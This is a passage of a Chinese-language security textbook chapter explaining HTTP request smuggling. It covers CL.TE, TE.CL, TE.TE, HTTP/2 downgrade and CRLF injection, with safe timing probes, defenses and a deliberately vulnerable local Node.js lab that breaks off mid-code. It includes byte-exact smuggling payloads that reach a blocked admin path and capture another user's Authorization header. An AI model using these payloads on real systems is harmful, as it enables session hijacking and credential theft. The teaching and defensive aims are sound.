# 第 3 章：協議解析差異與 HTTP 請求走私

在現代後端架構裡，為了撐住每秒上千筆的高併發流量，前端反向代理（如 Nginx、Envoy、CDN 節點）與後端應用伺服器（如 Node.js）之間，幾乎都會開啟 TCP Keep-Alive 連線池。不同外部使用者的 HTTP 請求在進到代理之後，會被排成一列，塞進同一條連往後端的持久 TCP 連線裡輪流傳送。

這套設計能省下反覆建立 TCP 三向交握的開銷，但它背後依賴一個極其脆弱的前提：**前端代理與後端伺服器，對於「第一筆請求在哪個位元組結束、第二筆請求從哪個位元組開始」，看法必須百分之百一致。** 一旦兩邊對訊息長度的演算法差了一點點，攻擊者就能把半截惡意請求偷偷留在這條共用管線裡，直接嫁接到下一位無辜使用者的請求頭上。這就是 **HTTP 請求走私**（HTTP Request Smuggling）。

---

## 從你已知的出發

為什麼前端 Nginx 明明寫死了 `location /internal/ { return 403; }`，外網任何人打 `/internal/admin` 都會被擋下來，攻擊者卻還是能只靠一筆普通的 `POST /v1/health` 請求，就讓後端乖乖執行 `/internal/admin` 並把結果吐出來？

關鍵就在那條「多人共用、持續複用」的上游 TCP 連線。在 NexusPay 裡，前端 Nginx 設了 `proxy_read_timeout = 30 s`，後端 Node.js 維持 `keepAliveTimeout = 5 s`；只要兩次請求間隔不到 5 秒，同一條上游 TCP socket 就會一直被不同使用者共用。如果攻擊者送出一筆同時帶了 `Content-Length` 與 `Transfer-Encoding` 的畸形請求，讓前端代理以為這是一筆長 `45 bytes` 的單一請求而整包放行，後端卻在第 `5` 個位元組就認定第一筆請求結束了，那麼剩下的 `40 bytes`（裡面正好寫著 `GET /internal/admin HTTP/1.1`）就會留在後端接收緩衝區裡，搖身一變成了這條連線上「下一筆請求」的開頭。

---

## 機制與推導

### 攻擊者目標與實質影響

HTTP 請求走私的核心目標，就是打破前端反向代理與後端伺服器對請求邊界的共識。

第一是**繞過外層存取控制**。攻擊者可以把被前端代理封鎖的路徑（像是 `/internal/admin`）偷渡進後端管線，讓外層的路徑白名單與 WAF 規則完全失效。

第二是**劫持他人會話與偷取憑證**。只要在後端共用的長連線 socket 裡留下一個還沒收尾的 `POST` 請求，下一位無辜使用者送來的合法請求（連同裡面的 `Authorization: Bearer ...` 或 `Cookie`）就會被整包吞進攻擊者的請求 Body 裡。

第三是**串接跨層攻擊鏈**。一旦靠走私偷到高權限的商戶或管理員 JWT，馬上就能接著打第 4 章的帳號全面接管，或是第 6 章的跨租戶資金盜領。

---

### HTTP/1.1 線路格式與 Keep-Alive 連線複用邊界

跟自帶二進位長度檔頭（Binary Frame Header）的 gRPC 或 HTTP/2 不同，HTTP/1.1（RFC 9112）跑在連續的 TCP 位元組串流上，完全是靠**夾在文字裡的換行符號與長度標頭**來切分每一筆訊息的。

在 TCP 傳輸層眼裡，根本沒有「一筆 HTTP 請求」這種外框。解析器必須先找 `CRLF`（`\r\n`，十六進位 `0x0d 0x0a`）來切開請求行跟每一個標頭，接著看到連續兩個 `CRLF`（`\r\n\r\n`）就知道標頭結束了，最後再照著標頭裡寫的長度規則，去數後面的 Body 要讀幾個位元組才算真正結束。

當反向代理開啟 Keep-Alive 連線池時，外部客戶端 A 與客戶端 B 各自連進來的獨立 TCP 連線，會在代理這一層匯流，排隊寫進同一條連往後端 Node.js 的長效 TCP socket：

```text
[Client A] --(TCP #1: Req A)--> +-------------------+
                                |  Front-End Proxy  | ==(Pooled Keep-Alive TCP)==> [Back-End Node.js]
[Client B] --(TCP #2: Req B)--> +-------------------+      [Req A bytes][Req B bytes]
```

這條共用管線要能不出亂子，全靠三個步驟嚴絲合縫：

首先，前端代理讀完 Client A 的整筆請求（標頭 + Body），把它完整寫進後端連線池的某條空閒 TCP socket。接著，後端解析器從這條 socket 讀出 Request A 的標頭跟**一字不差的 Body**，而且讀完的瞬間，讀取指標必須剛剛好停在 Request B 的第一個字母（例如 `GET` 的 `G`）上面。

要是後端解析器提早收工，少讀了 `k` 個位元組會怎樣？這 `k` 個沒人認領的位元組，就會繼續留在這條連線的接收緩衝區裡。只要連線沒斷，當 Nginx 把 Client B 的合法請求寫進同一條 socket 時，後端 Node.js 的 `llhttp` 解析器一抬頭，會先讀到那 `k` 個殘留位元組，把它當成下一筆請求的開頭（請求行與標頭），然後把 Client B 真正的請求直接拼在它屁股後面！

這就是 **HTTP 請求走私**（CWE-444）的物理本質：攻擊者根本沒有鑿穿防火牆，只是讓前端跟後端對同一串位元組切出了不同的段落。

回頭看 NexusPay 的基準設定：`proxy_read_timeout = 30 s` 和 Node.js `keepAliveTimeout = 5 s`。只要兩筆請求中間空檔不超過 `5 s`，同一條上游 socket 就會一直被借去裝不同商戶的請求；反過來說，如果前端已經把請求轉給後端、正在等後端回應，後端卻因為覺得「Body 還沒傳完」而呆呆等在那裡，Nginx 等滿 `30 s`（`proxy_read_timeout`）就會切斷連線並回傳 `504 Gateway Timeout`。這個 `30 s` 的等待時間差，正是我們後面用來安全偵測走私漏洞的關鍵訊號。

---

### `Content-Length` 與 `Transfer-Encoding` 的優先序衝突

既然關鍵在「怎麼算出 Body 有多長」，我們就來看看 RFC 9112 第 6.3 節規定的兩種 HTTP/1.1 長度宣告方式：

第一種是 **`Content-Length`**（簡稱 CL），直接用十進位整數告訴你 Body 有幾個位元組（例如 `Content-Length: 45`）。

第二種是 **`Transfer-Encoding: chunked`**（簡稱 TE），把 Body 切成一塊一塊送。每一塊的格式都是「十六進位長度 + `\r\n` + 資料內容 + `\r\n`」；等資料全部送完，最後再補上一個長度為 `0` 的終止區塊加上結尾空行 `0\r\n\r\n`（總共 `5 bytes`），代表整份 Body 到此結束。

問題來了：如果同一筆請求裡，**同時出現 `Content-Length` 和 `Transfer-Encoding: chunked`**，到底該聽誰的？

RFC 9112 §6.3 寫得很清楚：**`Transfer-Encoding` 的優先權必須蓋過 `Content-Length`**；而且規範還特別警告，同時帶這兩個標頭極可能是走私攻擊，伺服器最好直接當成錯誤拒收；如果 `Transfer-Encoding` 裡面有寫東西，但最後一個詞不是 `chunked`（比如寫成 `Transfer-Encoding: chunked, gzip`），伺服器 **MUST** 直接回 `400 Bad Request` 並關掉連線。

規矩雖然定了，但在真實世界裡，各種老舊代理、CDN 節點、自研 WAF 跟後端伺服器對這條規矩的實作卻常常各吹各的調。就連 Node.js 底層以嚴格著稱的 C 語言解析器 `llhttp`，歷史上也出過好幾次大包：

- **CVE-2022-32213**（影響 Node.js `< 14.20.1`、`< 16.17.1`、`< 18.9.1`）：`llhttp` 對變形或折行（`obs-fold`）的 `Transfer-Encoding` 標頭檢查有漏洞，導致前後端對 chunked 邊界的判斷不一致。
- **CVE-2023-30589**（影響 Node.js `< 16.20.1`、`< 18.16.1`、`< 20.3.1`）：`llhttp` 居然允許單獨一個 `\r`（只有 CR 沒有 LF）當作標頭換行符號，違背了 RFC 9112 必須是 `\r\n` 的鐵律，再次引發解析分歧。
- **人為關閉防護**：有些開發者為了接某家第三方廠商送來的不合規 Webhook，在啟動 Node.js 時順手加上 `insecureHTTPParser: true`（或 `--insecure-http-parser`），等於親手把 `llhttp` 的嚴格檢查全部關掉，讓雙標頭跟畸形標頭暢行無阻。

根據前端跟後端各自聽信哪一個標頭，HTTP/1.1 的請求走私可以分成三種經典牌型：`CL.TE`、`TE.CL` 與 `TE.TE`。

#### 1. `CL.TE`：前端看 `Content-Length`，後端看 `Transfer-Encoding`

在 `CL.TE` 組合裡，前端代理只看 `Content-Length` 決定要收多少位元組轉給後端；後端則乖乖照 RFC 優先看 `Transfer-Encoding: chunked`。這時攻擊者只要在 `0\r\n\r\n` 後面藏一筆偷渡請求，再把外層的 `Content-Length` 算準蓋住整包資料就行了。

直接看下面這個端到端實算的 `CL.TE` 封包（Worked Example 1）：

```text
=== 攻擊者送出的原始請求（含 \r\n 明確標記） ===
POST /v1/health HTTP/1.1\r\n
Host: api.nexuspay.example\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 45\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /internal/admin HTTP/1.1\r\n
X-Ignore: 

=== Body 位元組精確拆解（總計 45 bytes） ===
[Bytes  0..4 ]  0\r\n\r\n                         -> 1 + 2 + 2 =  5 bytes（終止區塊）
[Bytes  5..34]  GET /internal/admin HTTP/1.1\r\n  -> 28 + 2    = 30 bytes（走私請求行）
[Bytes 35..44]  X-Ignore:                         -> 10        = 10 bytes（未結尾標頭，無 \r\n）
----------------------------------------------------------------------
Total Body Length = 5 + 30 + 10 = 45 bytes（完全吻合 Content-Length: 45）
```

我們跟著這 `45 bytes` 的 Body 走一趟：

第一步，**前端代理看 CL**。它看到 `Content-Length: 45`，就從客戶端連線上精準讀完標頭後面的全部 `45 bytes`，整包原封不動寫進連往後端的 Keep-Alive socket，然後覺得這筆 `POST /v1/health` 已經處理完了。

第二步，**後端伺服器看 TE**。後端看到 `Transfer-Encoding: chunked`，就不理 `Content-Length: 45` 了。它一讀進前 `5 bytes`（`0\r\n\r\n`），馬上認定第一筆請求的 Body 已經結束，高高興興地回傳 `200 OK`。這時候，後面那 `45 - 5 = 40 bytes`（也就是 `GET /internal/admin HTTP/1.1\r\nX-Ignore: `）根本沒被讀走，還靜靜躺在後端的 TCP 接收緩衝區裡。

第三步，**無辜使用者踩雷**。下一毫秒，正常使用者送來一筆查餘額的請求：`GET /v1/balance HTTP/1.1\r\nHost: api.nexuspay.example\r\nAuthorization: Bearer eyJ...\r\n\r\n`。前端代理把它寫進同一條後端 socket，結果後端從緩衝區接起來讀到的，卻變成了這樣：

```http
GET /internal/admin HTTP/1.1
X-Ignore: GET /v1/balance HTTP/1.1
Host: api.nexuspay.example
Authorization: Bearer eyJ...

```

注意看兩個精妙的細節：
第一，我們在走私的那段 `GET /internal/admin` 裡面，**故意不寫 `Host:` 標頭**。因為根據 RFC 9112 §3.2，HTTP/1.1 請求只要出現兩個 `Host` 標頭，伺服器就必須回傳 `400 Bad Request`。
第二，最後一行 `X-Ignore: ` **結尾故意不加 `\r\n`**。這樣一來，無辜使用者送來的第一行 `GET /v1/balance HTTP/1.1\r\n` 就會直接被當成 `X-Ignore` 標頭的值吞掉；而使用者自己帶的第二行 `Host:` 跟第三行 `Authorization:`，就順理成章接在下面，變成了這筆 `/internal/admin` 請求的合法標頭！

#### 2. `TE.CL`：前端看 `Transfer-Encoding`，後端看 `Content-Length`

反過來，在 `TE.CL` 組合裡，前端代理照著 `Transfer-Encoding: chunked` 把所有區塊讀完才轉發，後端卻只看 `Content-Length` 宣告的短短幾個位元組就停手。

構造 `TE.CL` 封包時有個跟 `CL.TE` 很不一樣的地方：因為前端要驗完合法的 chunked 才會放行，所以你的封包最尾巴**一定得帶上區塊結尾的 `\r\n` 跟終止區塊 `0\r\n\r\n`**。如果你像剛剛一樣用 `GET` 搭配沒換行的 `X-Ignore: ` 收尾，那串 `\r\n0\r\n\r\n` 裡面的 `0` 就會掉到下一行變成一個沒有冒號 `:` 的非法標頭，後端一看語法不對馬上噴 `400 Bad Request`。

那怎麼把這個討厭的 `0\r\n\r\n` 藏起來？答案是：**把走私請求改寫成一筆 `POST`，並給它一個夠大的內層 `Content-Length`**，讓後端把 `0\r\n\r\n` 連同下一位使用者的請求一起當成 `POST` 的 Body 吞進肚子裡！

請看下面這份端到端實算的 `TE.CL` 封包（Worked Example 2）：

```text
=== 攻擊者送出的原始請求（含 \r\n 明確標記） ===
POST /v1/health HTTP/1.1\r\n
Host: api.nexuspay.example\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
55\r\n
POST /internal/admin HTTP/1.1\r\n
Host: api.nexuspay.example\r\n
Content-Length: 150\r\n
\r\n
a=1\r\n
0\r\n
\r\n

=== 位元組與十六進位區塊拆解 ===
[Header CL]    55\r\n                             -> 2 + 2     =  4 bytes（吻合外層 Content-Length: 4）
[Chunk Payload]
  POST /internal/admin HTTP/1.1\r\n               -> 29 + 2    = 31 bytes
  Host: api.nexuspay.example\r\n                  -> 26 + 2    = 28 bytes
  Content-Length: 150\r\n                         -> 19 + 2    = 21 bytes
  \r\n                                            ->           =  2 bytes
  a=1                                             ->           =  3 bytes
  Chunk Payload 合計 = 31 + 28 + 21 + 2 + 3 = 85 bytes = 0x55（十六進位）
[Chunk Trailer] \r\n0\r\n\r\n                     -> 2 + 5     =  7 bytes
----------------------------------------------------------------------
外層轉送總 Body = 4 + 85 + 7 = 96 bytes
```

（註：這裡因為內層的 `POST /internal/admin` 已經用 `\r\n\r\n` 把自己的標頭封口了，不會去借用被害者的標頭，所以內層必須自己帶一行 `Host: api.nexuspay.example\r\n` 才能通過後端的檢查。）

來算算這 `96 bytes` 在前後端是怎麼切開的：

第一步，**前端代理看 TE**。它讀到第一塊的十六進位長度 `55`（也就是十進位的 `85`），往下數了精準的 `85 bytes` 資料，確認後面跟著換行與終止區塊 `\r\n0\r\n\r\n`，覺得這是一筆完美合規的 chunked 請求，就把這 `96 bytes` 連同外層標頭一起轉給後端。

第二步，**後端伺服器看 CL**。後端只看外層標頭的 `Content-Length: 4`，於是只從 socket 讀走最前面的 `4 bytes`（也就是 `55\r\n`），就當作第一筆請求結束了！

第三步，**走私的 `POST` 把被害者整口吞掉**。現在後端緩衝區裡還躺著 `96 - 4 = 92 bytes`。後端接著往下讀，看到的是第二筆請求 `POST /internal/admin HTTP/1.1`，裡面宣告了 `Content-Length: 150`。扣掉標頭之後，目前空行後面的 Body 只有 `a=1\r\n0\r\n\r\n`（`3 + 2 + 5 = 10 bytes`）。因為 `10 < 150`，後端就會停在那裡等剩下的 `150 - 10 = 140 bytes`。這時下一位無辜使用者的請求一進來，他的請求行跟前面的 `Cookie`、`Authorization: Bearer ...` 標頭，剛好湊滿這 `140 bytes`，直接被塞進 `POST /internal/admin` 的 Body 裡存起來或反射回來！

#### 3. `TE.TE`：兩邊都支援 TE，但靠變形標頭騙過其中一邊

那如果前端跟後端都很守規矩，遇到雙標頭時都優先看 `Transfer-Encoding` 呢？

這時攻擊者會改玩 **`TE.TE` 混淆**：故意把 `Transfer-Encoding` 寫得歪七扭八，賭前端跟後端對「語法容錯」的尺度不一樣。只要其中一邊覺得「這標頭寫錯了我不認」而退回去看 `Content-Length`，另一邊卻好心幫你容錯照常當成 `chunked` 處理，一個原本安全對齊的系統，當場就會被打回 `CL.TE` 或 `TE.CL` 的原形！

實戰中常見的變形寫法有這幾種：
- **在冒號前面塞空白**：寫成 `Transfer-Encoding : chunked`。雖然 RFC 9112 §5.1 明令看到欄位名跟冒號中間有空白 **MUST** 直接回 `400 Bad Request`，但有些寫得不好的解析器只會默默忽略這行標頭（退回看 CL），另一邊卻幫忙把空白trim掉（繼續看 TE）。
- **塞入怪異控制字元或折行**：在 `chunked` 前面塞入垂直定位字元 `\x0b`（VT，不是合法的空白），或是把標頭折成兩行（已廢棄的 `obs-fold`）。
- **重複標頭或亂湊字**：同時送兩行 `Transfer-Encoding: chunked` 與 `Transfer-Encoding: identity`（賭一邊看第一行、一邊看最後一行），或是寫成 `Transfer-Encoding: xchunked`。

---

### 當 HTTP/2 降級成 HTTP/1.1：更危險的轉譯破口

很多人以為：「我們外層早就全面開 HTTP/2 了，HTTP/2 是二進位分幀（Binary Framing），每個 `DATA` frame 的檔頭都有明確的 24-bit 長度欄位，靠 `END_STREAM` 旗標收尾，哪來的文字切分歧義？」

話只說對了一半。如果從客戶端、反向代理一路到後端 Node.js 全程都跑 HTTP/2，確實沒有傳統走私的空間；但現在絕大多數的雲端架構，跑的都是「**對外收 HTTP/2，在邊緣代理終止後，對內降級（Downgrade）轉成 HTTP/1.1 丟進後端連線池**」！

在這個「把二進位 HTTP/2 翻譯成純文字 HTTP/1.1」的節點上，只要代理沒把 RFC 9113（HTTP/2 規範）的三條鐵律鎖緊，爆出來的走私漏洞比純 HTTP/1.1 還要狠。

#### 1. `H2.CL`：沒檢查 `content-length` 跟實際 `DATA` 長度一不一致

雖然 HTTP/2 本身不靠 `content-length` 標頭來切封包，但 RFC 9113 §8.1.1 還是允許請求帶上 `content-length` 標頭，只是附帶了一條死命令：**這個標頭寫的數字，MUST 完全等於所有 `DATA` frame 的資料總長度，只要對不上，就必須當成畸形請求（Malformed）直接回 `PROTOCOL_ERROR` 踢掉！**

如果前端的 HTTP/2 代理偷懶沒核對這件事，自己照著二進位 frame 收下了 `40 bytes` 的 Body，轉頭翻譯成 HTTP/1.1 時，卻把攻擊者在標頭裡亂填的 `content-length: 0` 原封不動抄到後端去。後端 Node.js 一看到 `Content-Length: 0`，在標頭結束的空行就立刻喊卡，後面那 `40 bytes` 的二進位 frame 資料當場在後端管線裡變成走私請求。

#### 2. `H2.TE`：忘了擋掉 HTTP/2 明令禁止的 `transfer-encoding`

RFC 9113 §8.2.2 規定得非常死：HTTP/2 **絕對禁止**出現任何跟單一連線綁定的標頭（Connection-Specific Headers），像是 `Connection`、`Keep-Alive`、`Upgrade`，還有最重要的 **`Transfer-Encoding`**（唯一例外是 `te: trailers`）。只要看到這些標頭，代理必須當場拒收。

要是代理沒擋掉 `transfer-encoding: chunked`，還在降級成 HTTP/1.1 時順手把它寫進後端請求裡，那攻擊者只要在 HTTP/2 的 `DATA` frame 裡放一段 `0\r\n\r\nGET /internal/admin ...`，後端收到被降級的 HTTP/1.1 請求時就會啟動 chunked 解析，在 `0\r\n\r\n` 提早切斷，完美重現 `CL.TE` 走私。

#### 3. HTTP/2 CRLF 標頭注入與請求劈裂（Request Splitting）

在純文字的 HTTP/1.1 裡，你沒辦法在一個標頭的值裡面塞進 `\r\n`，因為只要一換行，解析器就以為這行標頭結束了。但 HTTP/2 不一樣！HTTP/2 的標頭是用 HPACK 二進位長度前綴來編碼的（比如直接告訴你「接下來這個標頭值有 35 個 bytes」），所以在二進位封包裡，把 `\r\n`（`0x0d 0x0a`）塞進標頭值中間是完全編得出來的。

正因如此，RFC 9113 §8.2.1 嚴格規定：HTTP/2 的標頭名稱不准有大寫或空白，標頭值裡面 **MUST NOT** 包含 `\r`、`\n` 或 `\0`（NUL）。如果降級代理沒檢查這三個禁用字元，直接拿字串模板把 HTTP/2 標頭拼成 HTTP/1.1 文字，災難就發生了：

```text
// 1. 攻擊者在 HTTP/2 送出的單一標頭（二進位長度編碼，含 \r\n）
x-trace-id: abc\r\nTransfer-Encoding: chunked

// 2. 代理沒過濾，直接拼成 HTTP/1.1 純文字送給後端（\r\n 當場變成換行！）
GET /v1/balance HTTP/1.1\r\n
Host: api.nexuspay.example\r\n
x-trace-id: abc\r\n
Transfer-Encoding: chunked\r\n
```

更狠的是，如果在標頭值裡直接塞進兩個換行加上一整筆新請求（例如 `abc\r\n\r\nGET /internal/admin HTTP/1.1\r\nHost: localhost\r\n\r\n`），就算這只是一筆完全沒有 Body 的 `GET` 請求，到了 HTTP/1.1 管線裡也會被從中間硬生生劈成兩筆獨立的請求（Request Splitting），甚至能隨手偽造前端代理注入的 `X-Forwarded-For` 或 `X-Internal-User` 信任標頭。

順帶一提，請求走私在實戰中很少單獨收工：如果把走私請求拿去污染前端 CDN 的快取，就會變成跨使用者的**快取投毒**（Web Cache Poisoning，見第 11 章）；而利用 HTTP/2 單一連線在 `< 1 ms` 內同步送達 `20` 筆請求的最後 1 個 byte 來打穿交易鎖，則是第 12 章要講的 **Single-Packet Attack**；至於怎麼利用代理與 WAF 的解析落差繞過檢查，我們會在第 14 章深入拆解。

---

## 故障模式與防禦

### 怎麼在線上安全測試？非破壞性的時間差探測法

很多工程師剛學會請求走私，就興奮地拿著上面那段帶了 `GET /internal/admin` 的 Payload 去打公司的測試或線上環境。這在共用連線池的環境裡**非常危險**——因為你留在後端 socket 裡的那半截請求，下一毫秒撞上的可能不是你自己送的第二筆測試包，而是某個正在結帳的真實客戶！輕則讓客戶滿臉 `400 Bad Request`，重則把 A 客戶的帳號資料直接吐給 B 客戶。

為了不誤傷路人，實務上在排查走私漏洞時，第一步一定是用**時間差探測法**（Timing-Based Detection）。原理很簡單：我們不塞那段會污染別人的第二請求，而是故意送一筆「少給了幾個位元組」的半成品請求。如果前後端理解一致，馬上就會正常回傳；如果真的有走私漏洞，後端就會呆呆等在那裡討剩下的位元組，一路卡到 Nginx 的 `proxy_read_timeout = 30 s` 到期，噴出一個整整遲到 30 秒的 `504 Gateway Timeout`。

做時間差探測時，有兩支標準探針，而且**先後順序絕對不能搞反**：

#### 第一步：一定要先打 `CL.TE` 時間探針

先送一筆同時帶了 `Content-Length: 4` 與 `Transfer-Encoding: chunked` 的請求，Body 剛剛好給 `4 bytes` 的 `1\r\nZ`（故意不給後面的區塊結尾 `\r\n0\r\n\r\n`）：

```http
POST /v1/health HTTP/1.1
Host: api.nexuspay.example
Content-Length: 4
Transfer-Encoding: chunked

1\r\n
Z
```

看看這 `4 bytes` 會測出什麼結果：
- **如果系統有 `CL.TE` 漏洞**：前端看 `Content-Length: 4`，收到 `1\r\nZ` 覺得滿了，馬上轉給後端；後端看 `Transfer-Encoding: chunked`，讀完長度 `1` 跟字母 `Z`，就卡在那裡苦等結尾的 `\r\n0\r\n\r\n`，直到滿 `30 s` 觸發 Nginx 的 `504 Gateway Timeout`。而且因為沒有多餘的殘留位元組，超時斷線後不會污染其他使用者。
- **如果系統其實是 `TE.CL`（且前端會收完才轉發）**：前端自己先看 `Transfer-Encoding: chunked`，發現 `1\r\nZ` 根本還沒傳完，就會在前端入口等你補齊，根本不會把這包殘缺資料寫進後端共用連線池裡，對後端完全零干擾。

#### 第二步：確定不是 `CL.TE` 之後，才打 `TE.CL` 時間探針

如果第一步秒回正常（排除 `CL.TE`），我們才接著送第二支探針：標頭帶 `Content-Length: 6` 與 `Transfer-Encoding: chunked`，Body 送出 `6 bytes` 的 `0\r\n\r\nX`（前 `5 bytes` 是合法的終止區塊，第 `6` 個 byte 多塞一個字母 `X`）：

```http
POST /v1/health HTTP/1.1
Host: api.nexuspay.example
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
X
```

- **如果系統有 `TE.CL` 漏洞**：前端看 `Transfer-Encoding: chunked`，讀到第 5 個 byte `0\r\n\r\n` 就覺得請求結束了，只把這 `5 bytes` 轉給後端（那個多出來的 `X` 留在攻擊者自己的前端連線裡，沒進後端）；後端卻看 `Content-Length: 6`，只收到 `5 bytes` 就在那裡苦等第 6 個 byte，當場卡滿 `30 s` 超時！
- **為什麼絕對不能把這支探針放第一步打？** 想像一下，如果目標其實是 `CL.TE`，而你一上來就先打這支 `0\r\n\r\nX`：前端看 `Content-Length: 6`，會把連同 `X` 在內的全部 `6 bytes` 統統塞進後端共用連線池；後端看 `TE` 讀完 `0\r\n\r\n` 秒回 `200 OK`，那個多出來的字母 `X` 就留在後端共用 socket 裡了！下一位倒楣使用者的 `GET /v1/balance` 一進來，馬上被拼成 `XGET /v1/balance` 當場炸掉。所以記住鐵則：**先測 `CL.TE`，排除後再測 `TE.CL`**。

---

### 五大走私故障模式總整理

| 走私牌型 | 前後端怎麼雞同鴨講 | 什麼時候會踩中 | 最直接的殺傷力 |
|---|---|---|---|
| `CL.TE` | 前端看 `CL`、後端看 `TE` | 請求同時帶 `CL` 與 `TE: chunked`，代理沒擋雙標頭 | 繞過前端代理的路徑封鎖、偷改下一位使用者的請求標頭 |
| `TE.CL` | 前端看 `TE`、後端看 `CL` | 代理把 `TE` 請求轉給只看 `CL` 的後端（或重寫標頭出包） | 把下一位使用者的 `Authorization` 或 `Cookie` 整包吞進 `POST` Body |
| `TE.TE` | 兩邊都看 `TE`，但容錯尺度不同 | 標頭寫成 `TE : chunked`、折行、`xchunked` 或雙重 `TE` | 騙其中一邊放棄 `TE` 退回看 `CL`，把系統打回 `CL.TE` 或 `TE.CL` |
| `H2.CL` / `H2.TE` | H2 代理降級轉 H1.1 時漏做合規檢查 | 放行長度跟 `DATA` 對不上的 `content-length`，或沒擋掉 `transfer-encoding` | 藉由穩定的 HTTP/2 多工通道，對後端 HTTP/1.1 連線池發動走私 |
| `H2` CRLF 注入 | HPACK 標頭值藏了 `\r\n`，轉譯時沒擋 | `:path` 或一般標頭值夾帶 `0x0d 0x0a`，直接拼進 H1.1 文字流 | 任意注入偽造標頭、甚至把一筆無 Body 的 H2 請求劈成兩筆 H1.1 請求 |

---

### 怎麼徹底根治？三層縱深防禦框架

千萬別想著「在 WAF 寫幾條正規表達式擋掉 `Transfer-Encoding`」就能修好請求走私——攻擊者隨便換個大小寫、塞個控制字元或走 HTTP/2 降級就能輕鬆穿過去（見第 14 章）。真正可靠的防禦，必須從協定拓樸、解析器底線與連線池隔離三個層次下手：

| 防禦層次 | 具體工程做法 | 能消滅哪些問題 | 代價與取捨 | 什麼時候用 |
|---|---|---|---|---|
| **1. 前後端全程統一 HTTP/2** | 反向代理到後端服務之間也全面走 **HTTP/2**（h2 或 h2c），徹底拔掉 H2 轉 H1.1 的降級轉譯層 | 從根源消滅所有純文字切分與降級歧義（`CL.TE`、`TE.CL`、`TE.TE`、`H2.*` 全數免疫） | 需確認後端容器、Sidecar 與框架原生支援 HTTP/2 且中間沒有任何元件偷降級 | 所有現代可控微服務架構的**首選方案** |
| **2. 解析器嚴格執行 RFC 鐵律** | H1.1 只要同時看到 `CL` 與 `TE`、重複 `CL`、或 `TE` 不是以 `chunked` 結尾，一律回 `400` 並斷線；H2 只要標頭含 `\r`/`\n`/`\0`、帶了 `transfer-encoding` 或 `content-length` 與 `DATA` 長度不符，一律回 `PROTOCOL_ERROR` 拒收 | 堵死 RFC 9112/9113 的模糊空間與 `TE.TE` 變形；Node.js 維持 `llhttp` 預設嚴格模式 | 極少數不守規矩的老舊第三方 Webhook 客戶端會被拒收（這時該叫對方修客戶端，絕不能把伺服器的 `insecureHTTPParser` 打開） | **全環境必備底線**（尤其是上游還留著 H1.1 時） |
| **3. 停用上游 Keep-Alive 連線複用** | 關閉代理到後端的 Keep-Alive 連線池（每筆外部請求都開一條全新的短連線打後端，打完即關） | 就算後端真的有未知的解析差異，多出來的位元組也會隨著連線關閉被清掉，絕不會跨請求污染到別的使用者 | 每筆請求多一次內網 TCP 三向交握延遲與 `TIME_WAIT` 連接埠消耗 | 遇到閉源老舊代理、一時無法升級時的**緊急止血手段** |

針對 Node.js 後端，請在 CI 加入一條簡單的靜態檢查：掃描所有 `http.createServer`、`https.createServer` 和啟動腳本，**絕對禁止出現 `insecureHTTPParser: true` 或 `--insecure-http-parser`**，並把執行環境保持在已修補 `CVE-2022-32213` 與 `CVE-2023-30589` 的 Node.js 22 LTS。同時，像 `/internal/admin` 這種高權限端點，絕不能只靠外層 Nginx 擋路徑，後端自己也必須驗證內部 mTLS 憑證或服務簽章（見第 4 章與第 6 章）。

---

## 動手做

- **難度**：進階
- **預估時間**：45 分鐘

現在我們用本地 Node.js 跑一個零成本、位元組完全透明的雙層實驗環境：外層是「只看 `Content-Length` 切封包、且負責擋掉 `/internal/admin`」的前端代理（Port `18080`），內層則是「優先看 `Transfer-Encoding: chunked`」的後端伺服器（Port `18081`），兩者之間共用一條 Keep-Alive 長連線。你要親手寫一支 Python raw socket 腳本，把那包 `45 bytes` 的 `CL.TE` 走私請求送進去，看看下一位無辜使用者的請求是怎麼被偷換成 `/internal/admin` 的。

### 步驟 1：跑起本地 `CL.TE` 雙層靶機

因為現代 Node.js 22 內建的 `http` 模組（`llhttp`）預設已經會擋掉雙標頭，為了讓你清楚看到底層 socket 緩衝區裡每個位元組被切開與殘留的過程，我們用 Node.js 原生的 `net` 模組寫一個極簡的雙層靶機 `lab_smuggle.mjs`：

```javascript
// lab_smuggle.mjs (僅限本地實驗用途)
import net from 'node:net';

// 1. 模擬後端伺服器 (Port 18081)：優先看 Transfer-Encoding: chunked
const backend = net.createServer((socket) => {
  let buf = Buffer.alloc(0);

  socket.on('data', (chunk) => {
    buf = Buffer.concat([buf, chunk]);

    while (true) {
      const hdrEnd = buf.indexOf('\r\n\r\n');
      if (hdrEnd === -1) break;

      const hdrText = buf.subarray(0, hdrEnd).toString('latin1');
      const lines = hdrText.split('\r\n');
      const [method, path] = lines[0].split(' ');
      const headers = {};
      for (const line of lines.slice(1)) {
        const idx = line.indexOf(':');
        if (idx > 0) {
          headers[line.slice(0, idx).trim().toLowerCase()] = line.slice(idx + 1).trim();
        }
      }

      const bodyStart = hdrEnd + 4;
      let bodyEnd = -1;

      if ((headers['transfer-encoding'] || '').toLowerCase() === 'chunked') {
        // 後端優先看 TE：找到 0\r\n\r\n 就認定這筆請求結束了
        const teEnd = buf.indexOf('0\r\n\r\n', bodyStart);
        if (teEnd === -1) break;
        bodyEnd = teEnd + 5;
      } else if (headers['content-length']) {
        const cl = parseInt(headers['content-length'], 10);
        if (buf.length < bodyStart + cl) break;
        bodyEnd = bodyStart + cl;
      } else {
        bodyEnd = bodyStart;
      }

      // 切走這筆請求，但沒讀完的殘留位元組會繼續留在 buf 裡！
      buf = buf.subarray(bodyEnd);

      const respBody = path === '/internal/admin'
        ? 'ADMIN_SECRET_ACCESS_GRANTED\n'
        : `OK:${method}:${path}\n`;
      const resp =
        `HTTP/1.1 200 OK\r\nContent-Length: ${Buffer.byteLength(respBody)}\r\nConnection: keep-alive\r\n\r\n${respBody}`;
      socket.write(resp);
    }
  });
});

// 2. 模擬脆弱版前端代理 (Port 18080)：只看 Content-Length 切封包，並共用同一條 upstreamSocket
let upstreamSocket = null;
const pendingCallbacks = [];

function ensureUpstream() {
  if (upstreamSocket && !upstreamSocket.destroyed) return;
  upstreamSocket = net.connect(18081, '127.0.0.1');
  let respBuf = Buffer.alloc(0);
  upstreamSocket.on('data', (d) => {
    respBuf = Buffer.concat([respBuf, d]);
    while (true) {
      const end = respBuf.indexOf('\r\n\r\n');
      if (end === -1) break;
      const m = respBuf.subarray(0, end).toString('latin1').match(/Content-Length:\s*(\d+)/i);
